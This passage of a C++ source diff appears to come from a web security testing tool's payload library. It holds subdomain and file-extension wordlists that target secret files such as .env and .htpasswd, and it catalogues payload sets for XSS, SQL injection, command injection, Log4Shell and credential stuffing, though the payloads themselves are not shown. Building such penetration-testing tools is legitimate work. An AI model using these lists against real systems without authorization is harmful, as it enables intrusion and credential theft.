nimg3\nimg4\nimg5\nimage1\nimage2\nimage3\nimages1\nimages2\nimages3\nstatic1\nstatic2\nstatic3\nstatic4\nstatic5\nassets1\nassets2\nassets3\nassets4\nassets5\ncdn1\ncdn2\ncdn3\ncdn4\ncdn5\nedge\nedge1\nedge2\nedge3\nedge-cdn\nedge_cdn\nedgecdn\npop\npop3\npops\npop3s\nimap\nimaps\nsmtp1\nsmtp2\nsmtps\nsubmission\nmailgateway\nmail-gateway\nmail_gateway\nmail-relay\nmail_relay\nmailrelay\nmx\nmx1\nmx2\nmx3\nmxa\nmxb\nmxc\nspf\ndkim\ndmarc\nbimi\ntrust\ntrust1\ntrust2\nhelpdesk\nsupport\nsupport1\nsupport2\nticket\ntickets\nhelp\nfaq\nkb\nknowledgebase\nknowledge-base\nknowledge_base\nwiki\nconfluence\njira\nyoutrack\nlinear\nasana\ntrello\nclickup\nbasecamp\nmonday\nntfy\npushover\npushbullet\nzapier\nintegromat\nmake\nnode-red\nnodered\nnode_red\nrundeck\nairflow\nprefect\ndagster\nflyte\nmlflow\nkubeflow\nseldon\nseldon-core\nseldoncore\ntorch\ntorchserve\ntorchserveR\ntensorflow\ntensorflow-serving\ntfx\ntfserving\ntf-serving\ntf_serving\ntfx-server\ntfx_server\nray\nray-serve\nray_serve\nrayserve\nbentoml\ncortexlabs\ncortex\ncortex-labs\ncortex_labs\nclearml\nweights-and-biases\nwandb\ncometml\ncomet-ml\ncomet_ml\nsagemaker\nvertexai\nvertex-ai\nvertex_ai\nazureml\nazure-ml\nazure_ml\ndatabricks-mlflow\nopenai\nopen-ai\nopen_ai\nanthropic\ncohere\nai21\nstability\nstability-ai\nstabilityai\nstable-diffusion\nstablediffusion\nmidjourney\nrunway\nrunwayml\ndalle\ndalle2\ndalle3\nhuggingface\nhugging-face\nhugging_face\nhf\nspaces\ngradio\nstreamlit\ndash\ndashapp\nplotly\nsuperset\nmetabase\nlooker\ntableau\npowerbi\nquicksight\nsisense\ndomo\nthoughtspot\nthoughtspotcloud\nthoughtspot-cloud\nsap\ndynamics\nworkday\nservicenow\nsalesforce\nmarketo\nhubspot\nintercom\nzendesk\nfreshdesk\ndrift\ncalendly\nzapline\ncustomerio\nsendgrid\nmailgun\npostmark\nmandrill\nmailchimp\nsendinblue\ncampaignmonitor\ncampaign-monitor\ncampaign_monitor\namazonses\nses\namazon-ses\namazon_ses\naws-ses\naws_ses\nsmsgateway\nsms-gateway\nsms_gateway\ntwilio\nvonage\nnexmo\nplivo\nmessagebird\nsignal\nwhatsapp\nwa\nwa-business\nwa_business\nwabusiness\ntelegram\ntg\nviber\nline\nwechat\nweixin\nqq\nkakaotalk\nkakao\nteams1\nteams2\nslack1\nslack2\nzoom1\nzoom2\nwebex1\nwebex2\nmeet1\nmeet2\nrooms\nroom1\nroom2\nroom3\nconference\nconf\nconferencing\nmeeting\nmeetings\nvoice\nvideo\nvideoconf\nvideo-conf\nvideo_conf\nvoip\nvoice-over-ip\nvoice_over_ip\nsipx\nsippx\nsippx1\nsippx2\nsipy\nsippy\nsippy1\nsippy2\nfreepbx1\nfreepbx2\n3cx1\n3cx2\nasterisk1\nasterisk2\nturnserver1\nturnserver2\nstun-server\nstun_server\nstunserver\nturn-server\nturn_server\nturnserver\nstun-srv\nstun_srv\nstunsrv\nturn-srv\nturn_srv\nturnsrv\nbacker\nbackend\nback-end\nback_end\nfrontend\nfront-end\nfront_end\nmiddleware\nmsg\nmessage\nmessages\nmessaging\nqueue\nqueues\njobs\nworker\nworkers\nbatch\nbatch-job\nbatch_job\nbatchjob\nbatch-worker\nbatch_worker\nbatchworker\ncron\ncrons\nscheduler\nschedulers\nscheduled\nrouter1-prod\nrouter2-prod\nrouter1-stg\nrouter2-stg\nrouter1-dev\nrouter2-dev\nrouter1-uat\nrouter2-uat\nrouter1-qa\nrouter2-qa\nrouter1-prod-1\nrouter1-prod-2\nrouter1-prod-3\nrouter1-stg-1\nrouter1-stg-2\nrouter1-dev-1\nrouter1-dev-2\nrouter1-uat-1\nrouter1-uat-2\nrouter1-qa-1\nrouter1-qa-2\nrouter1.prod\nrouter2.prod\nrouter1.stg\nrouter2.stg\nrouter1.dev\nrouter2.dev\nrouter1.uat\nrouter2.uat\nrouter1.qa\nrouter2.qa\nrouter1.prod.1\nrouter1.prod.2\nrouter1.prod.3\nrouter1.stg.1\nrouter1.stg.2\nrouter1.dev.1\nrouter1.dev.2\nrouter1.uat.1\nrouter1.uat.2\nrouter1.qa.1\nrouter1.qa.2\n";
+
+static const char* kFuzzdbExtensions =
+    ".php\n.php3\n.php4\n.php5\n.php7\n.phtml\n.phps\n.phar\n.asp\n.aspx\n.ashx\n.asmx\n.cer\n.svc\n.vbs\n.jsp\n.jspx\n.do\n.action\n.cfm\n.cfml\n.cgi\n.pl\n.py\n.rb\n.go\n.rs\n.sh\n.bash\n.ksh\n.zsh\n.bat\n.cmd\n.ps1\n.psm1\n.vb\n.exe\n.com\n.scr\n.dll\n.so\n.dylib\n.a\n.lib\n.jar\n.war\n.ear\n.apk\n.ipa\n.deb\n.rpm\n.pkg\n.msi\n.zip\n.tar\n.tar.gz\n.tgz\n.bz2\n.tar.bz2\n.7z\n.rar\n.gz\n.xz\n.lz\n.lzma\n.zst\n.bak\n.bak1\n.bak2\n.bak~\n.bakup\n.old\n.orig\n.original\n.save\n.swp\n.swo\n.swn\n.tmp\n.temp\n.test\n.dev\n.stg\n.prod\n.uat\n.qa\n.beta\n.alpha\n.rc\n~\n.gitignore\n.gitattributes\n.htaccess\n.htpasswd\n.DS_Store\n.env\n.env.local\n.env.dev\n.env.development\n.env.prod\n.env.production\n.env.staging\n.env.stage\n.env.test\n.env.example\n.env.sample\n.env.template\n.env.bak\n.env.save\n.env.old\n.env.orig\n.config\n.cnf\n.ini\n.conf\n.cfg\n.toml\n.yml\n.yaml\n.xml\n.json\n.jsonc\n.csv\n.tsv\n.txt\n.md\n.markdown\n.log\n.logs\n.html\n.htm\n.xhtml\n.shtml\n.shtm\n.dhtml\n.htmls\n.sql\n.sqlite\n.sqlite3\n.db\n.db3\n.mdb\n.accdb\n.dat\n.dump\n.pgsql\n.psql\n.bz2.sql\n.tar.sql\n.gz.sql\n.zip.sql\n.session\n.sessions\n.cache\n.lock\n.pid\n.sock\n.socket\n.fifo\n.pipe\n.git\n.svn\n.hg\n.bzr\n.cvs\n.darcs\n.fossil\n.git/HEAD\n.git/config\n.git/index\n.git/logs/HEAD\n.svn/entries\n.hg/store/00manifest.i\n";
+
+static const char* kHeadersSec =
+    "Strict-Transport-Security\n"
+    "Content-Security-Policy\n"
+    "X-Content-Type-Options\n"
+    "X-Frame-Options\n"
+    "X-XSS-Protection\n"
+    "Referrer-Policy\n"
+    "Permissions-Policy\n"
+    "Feature-Policy\n"
+    "Cross-Origin-Opener-Policy\n"
+    "Cross-Origin-Embedder-Policy\n"
+    "Cross-Origin-Resource-Policy\n"
+    "Cache-Control\n"
+    "Pragma\n"
+    "Expires\n"
+    "Public-Key-Pins\n"
+    "Public-Key-Pins-Report-Only\n"
+    "Expect-CT\n"
+    "Expect-Staple\n"
+    "Server\n"
+    "X-Powered-By\n"
+    "X-AspNet-Version\n"
+    "X-AspNetMvc-Version\n"
+    "Set-Cookie\n"
+    "Origin-Agent-Cluster\n"
+    "Clear-Site-Data\n"
+    "Sec-Fetch-Site\n"
+    "Sec-Fetch-Mode\n"
+    "Sec-Fetch-User\n"
+    "Sec-Fetch-Dest\n"
+    "Sec-CH-UA\n"
+    "Sec-CH-UA-Mobile\n"
+    "Sec-CH-UA-Platform\n"
+    "Access-Control-Allow-Origin\n"
+    "Access-Control-Allow-Credentials\n"
+    "Access-Control-Allow-Methods\n"
+    "Access-Control-Allow-Headers\n"
+    "Access-Control-Expose-Headers\n"
+    "Access-Control-Max-Age\n"
+    ;
+
+struct builtin_def_t
+{
+    const char* id;
+    const char* label;
+    const char* description;
+    const char* blob;
+};
+
+static const builtin_def_t kBuiltins[] = {
+    { "xss/polyglot", "XSS Polyglot", "Polyglot XSS payloads that work in many contexts at once.", kXssPolyglot },
+    { "xss/standard", "XSS Standard", "Standard reflected/stored XSS payload corpus.", kXssStandard },
+    { "sqli/error", "SQLi Error-Based", "Payloads that trigger SQL errors across common dialects.", kSqliError },
+    { "sqli/boolean", "SQLi Boolean-Based", "True/false pairs for boolean-blind SQL injection.", kSqliBoolean },
+    { "sqli/time", "SQLi Time-Based", "Sleep-based payloads for time-blind SQL injection.", kSqliTime },
+    { "cmdi/unix", "Command Injection - Unix", "Unix command-injection payloads with separators and substitutions.", kCmdiUnix },
+    { "cmdi/windows", "Command Injection - Windows", "Windows cmd/PowerShell command-injection payloads.", kCmdiWindows },
+    { "lfi/unix", "LFI - Unix", "Local file inclusion / path traversal payloads for *nix targets.", kLfiUnix },
+    { "lfi/windows", "LFI - Windows", "Local file inclusion / path traversal payloads for Windows targets.", kLfiWindows },
+    { "rce/log4j", "RCE - Log4Shell", "Log4j JNDI lookup payload variants for CVE-2021-44228.", kRceLog4j },
+    { "rce/spring", "RCE - Spring", "Spring/SpEL/OGNL RCE payload set.", kRceSpring },
+    { "rce/struts", "RCE - Struts", "Apache Struts OGNL RCE payload set.", kRceStruts },
+    { "ssrf/cloud", "SSRF - Cloud Metadata", "Cloud metadata service URLs (AWS/GCP/Azure/Alibaba/DigitalOcean/OpenStack).", kSsrfCloud },
+    { "ssrf/loopback", "SSRF - Loopback", "Loopback bypass payloads (127.0.0.1, [::1], decimal/hex/octal forms).", kSsrfLoopback },
+    { "ssti/all-engines", "SSTI - All Engines", "Server-side template injection payloads for Jinja/Twig/Velocity/Freemarker/Smarty/Handlebars/ERB.", kSstiAll },
+    { "auth/usernames-top1000", "Usernames - Top", "Common usernames for credential-stuffing and login brute.", kAuthUsernamesTop1000 },
+    { "auth/passwords-top1000", "Passwords - Top", "Common passwords for credential-stuffing.", kAuthPasswordsTop1000 },
+    { "dirs/common-100", "Directories - Common 100", "Top 100 directory/file names for content discovery.", kDirsCommon100 },
+    { "dirs/quickhits", "Directories - Quick Hits", "High-value low-volume hits (configs, dotfiles, dumps).", kDirsQuickhits },
+    { "dirs/big", "Directories - Big", "Wider directory and file wordlist for content discovery.", kDirsBig },
+    { "subdomains/top1000", "Subdomains - Top", "Top subdomain labels for brute-force enumeration.", kSubdomainsTop1000 },
+    { "fuzzdb/extensions", "File Extensions", "File extensions for content-discovery extension mode.", kFuzzdbExtensions },
+    { "headers/security-headers", "HTTP Security Headers", "Names of security-related HTTP response headers.", kHeadersSec },
+};
+
+}
+
+std::string storage_dir()
+{
+    PWSTR known = nullptr;
+    std::string base;
+    if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, nullptr, &known)) && known)
+    {
+        const int needed = WideCharToMultiByte(CP_UTF8, 0, known, -1, nullptr, 0, nullptr, nullptr);
+        if (needed > 1)
+        {
+            base.assign(static_cast<size_t>(needed - 1), '\0');
+            WideCharToMultiByte(CP_UTF8, 0, known, -1, base.data(), needed, nullptr, nullptr);
+        }
+        CoTaskMemFree(known);
+    }
+    if (base.empty()) base = "C:\\Users\\Public";
+    base += "\\AiDA\\Standalone\\burp\\payloads\\";
+    std::error_code ec;
+    std::filesystem::create_directories(base, ec);
+    return base;
+}
+
+bool initialize()
+{
+    auto& st = s();
+    bool expected = false;
+    if (!st.initialized.compare_exchange_strong(expected, true)) return true;
+
+    std::lock_guard<std::mutex> lk(st.mtx);
+    for (const auto& b : kBuiltins)
+    {
+        payload_set_t p;
+        p.id          = b.id;
+        p.label       = b.label;
+        p.description = b.description;
+        p.builtin     = true;
+        p.entries     = split_lines(b.blob);
+        st.sets[p.id] = std::move(p);
+    }
+
+    std::error_code ec;
+    const std::string dir = storage_dir();
+    if (std::filesystem::exists(dir, ec))
+    {
+        for (auto it = std::filesystem::directory_iterator(dir, ec); !ec && it != std::filesystem::directory_iterator(); ++it)
+        {
+            if (!it->is_regular_file()) continue;
+            std::string fname = it->path().filename().string();
+            if (fname.size() < 5 || fname.substr(fname.size() - 4) != ".txt") continue;
+            std::string id = fname.substr(0, fname.size() - 4);
+            std::replace(id.begin(), id.end(), '_', '/');
+
+            std::ifstream f(it->path(), std::ios::binary);
+            if (!f) continue;
+            std::ostringstream oss;
+            oss << f.rdbuf();
+            const std::string blob = oss.str();
+            std::vector<std::string> lines;
+            std::string cur;
+            for (char c : blob)
+            {
+                if (c == '\n') { if (!cur.empty()) lines.push_back(cur); cur.clear(); }
+                else if (c != '\r') cur.push_back(c);
+            }
+            if (!cur.empty()) lines.push_back(cur);
+
+            payload_set_t p;
+            p.id          = id;
+            p.label       = id;
+            p.description = "Custom set loaded from disk.";
+            p.builtin     = false;
+            p.entries     = std::move(lines);
+
+            auto exist = st.sets.find(id);
+            if (exist == st.sets.end() || !exist->second.builtin)
+                st.sets[id] = std::move(p);
+        }
+    }
+    diag::log_tagged_fmt("burp.payloads", "initialize sets=%zu", st.sets.size());
+    return true;
+}
+
+void shutdown()
+{
+    auto& st = s();
+    if (!st.initialized.exchange(false)) return;
+    std::lock_guard<std::mutex> lk(st.mtx);
+    st.sets.clear();
+}
+
+const payload_set_t* get(const std::string& id)
+{
+    auto& st = s();
+    std::lock_guard<std::mutex> lk(st.mtx);
+    auto it = st.sets.find(id);
+    if (it == st.sets.end()) return nullptr;
+    return &it->second;
+}
+
+std::vector<std::string> list_ids()
+{
+    auto& st = s();
+    std::vector<std::string> out;
+    std::lock_guard<std::mutex> lk(st.mtx);
+    out.reserve(st.sets.size());
+    for (auto& kv : st.sets) out.push_back(kv.first);
+    std::sort(out.begin(), out.end());
+    return out;
+}
+
+std::vector<payload_set_t> list_summaries()
+{
+    auto& st = s();
+    std::vector<payload_set_t> out;
+    std::lock_guard<std::mutex> lk(st.mtx);
+    out.reserve(st.sets.size());
+    for (auto& kv : st.sets)
+    {
+        payload_set_t cp;
+        cp.id          = kv.second.id;
+        cp.label       = kv.second.label;
+        cp.description = kv.second.description;
+        cp.builtin     = kv.second.builtin;
+        cp.entries.clear();
+        out.push_back(std::move(cp));
+    }
+    std::sort(out.begin(), out.end(), [](const payload_set_t& a, const payload_set_t& b) { return a.id < b.id; });
+    return out;
+}
+
+std::vector<std::string> entries(const std::string& id, size_t max_count)
+{
+    auto& st = s();
+    std::lock_guard<std::mutex> lk(st.mtx);
+    auto it = st.sets.find(id);
+    if (it == st.sets.end()) return {};
+    if (max_count == 0 || max_count >= it->second.entries.size()) return it->second.entries;
+    return std::vector<std::string>(it->second.entries.begin(), it->second.entries.begin() + max_count);
+}
+
+std::vector<std::string> search(const std::string& query, const std::string& set_id)
+{
+    std::vector<std::string> out;
+    if (query.empty()) return out;
+    auto& st = s();
+    std::string ql = query;
+    std::transform(ql.begin(), ql.end(), ql.begin(), [](unsigned char c){ return static_cast<char>(std::tolower(c)); });
+
+    std::lock_guard<std::mutex> lk(st.mtx);
+    auto check_set = [&](const payload_set_t& p) {
+        for (const auto& e : p.entries)
+        {
+            std::string el = e;
+            std::transform(el.begin(), el.end(), el.begin(), [](unsigned char c){ return static_cast<char>(std::tolower(c)); });
+            if (el.find(ql) != std::string::npos)
+                out.push_back(e);
+        }
+    };
+    if (set_id.empty())
+    {
+        for (auto& kv : st.sets) check_set(kv.second);
+    }
+    else
+    {
+        auto it = st.sets.find(set_id);
+        if (it == st.sets.end()) return out;
+        check_set(it->second);
+    }
+    return out;
+}
+
+bool add_custom_set(const std::string& id, const std::string& label, const std::string& description, const std::vector<std::string>& entries_in)
+{
+    if (id.empty())
+    {
+        set_err("empty id");
+        return false;
+    }
+    auto& st = s();
+    {
+        std::lock_guard<std::mutex> lk(st.mtx);
+        auto it = st.sets.find(id);
+        if (it != st.sets.end() && it->second.builtin)
+        {
+            set_err("cannot override built-in id");
+            return false;
+        }
+        payload_set_t p;
+        p.id          = id;
+        p.label       = label.empty() ? id : label;
+        p.description = description;
+        p.builtin     = false;
+        p.entries     = entries_in;
+        st.sets[id] = std::move(p);
+    }
+    return export_to_file(storage_path_for(id), id);
+}
+
+bool remove_custom_set(const std::string& id)
+{
+    auto& st = s();
+    {
+        std::lock_guard<std::mutex> lk(st.mtx);
+        auto it = st.sets.find(id);
+        if (it == st.sets.end())
+        {
+            set_err("not found");
+            return false;
+        }
+        if (it->second.builtin)
+        {
+            set_err("cannot remove built-in");
+            return false;
+        }
+        st.sets.erase(it);
+    }
+    std::error_code ec;
+    std::filesystem::remove(storage_path_for(id), ec);
+    return true;
+}
+
+bool load_from_file(const std::string& path, const std::string& id)
+{
+    if (id.empty())
+    {
+        set_err("empty id");
+        return false;
+    }
+    std::ifstream f(path, std::ios::binary);
+    if (!f)
+    {
+        set_err("open failed");
+        return false;
+    }
+    std::vector<std::string> lines;
+    std::string ln;
+    while (std::getline(f, ln))
+    {
+        while (!ln.empty() && (ln.back() == '\r' || ln.back() == '\n')) ln.pop_back();
+        if (!ln.empty()) lines.push_back(ln);
+    }
+    return add_custom_set(id, id, "Loaded from " + path, lines);
+}
+
+bool export_to_file(const std::string& path, const std::string& id)
+{
+    auto& st = s();
+    std::vector<std::string> snapshot;
+    {
+        std::lock_guard<std::mutex> lk(st.mtx);
+        auto it = st.sets.find(id);
+        if (it == st.sets.end())
+        {
+            set_err("not found");
+            return false;
+        }
+        snapshot = it->second.entries;
+    }
+    std::filesystem::path p(path);
+    std::error_code ec;
+    std::filesystem::create_directories(p.parent_path(), ec);
+    std::ofstream f(p, std::ios::binary | std::ios::trunc);
+    if (!f)
+    {
+        set_err("open for write failed");
+        return false;
+    }
+    for (const auto& e : snapshot)
+    {
+        f.write(e.data(), static_cast<std::streamsize>(e.size()));
+        f.put('\n');
+    }
+    return true;
+}
+
+bool set_exists(const std::string& id)
+{
+    auto& st = s();
+    std::lock_guard<std::mutex> lk(st.mtx);
+    return st.sets.find(id) != st.sets.end();
+}
+
+std::string last_error()
+{
+    auto& st = s();
+    std::lock_guard<std::mutex> lk(st.err_mtx);
+    return st.last_err;
+}
+
+}
+}
+}
